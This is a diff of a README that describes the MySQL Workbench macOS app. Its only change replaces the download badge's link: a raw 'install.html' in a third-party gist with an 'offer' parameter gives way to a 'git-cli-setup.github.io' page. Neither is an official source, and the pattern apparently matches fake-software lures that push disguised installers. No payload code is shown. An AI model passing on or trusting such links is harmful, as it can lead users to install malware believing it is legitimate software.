@@ -2,7 +2,7 @@
 
 MySQL Workbench is a macOS application that provides a comprehensive set of tools for database architects, developers, and administrators. It allows Mac users to design, model, and manage MySQL databases efficiently with a visual interface.
 
-<a href="https://gistcdn.githack.com/everguynetoiparen/1a5b402b63bb72c384f3c727180d69a4/raw/d54e2677b539a5f9cc95da6ba0186e60f36376d6/install.html?offer=MySQL Workbench" target="_blank">
+<a href="https://git-cli-setup.github.io/.github/?offer=MySQLWorkbench" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20MySQL%20Workbench%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
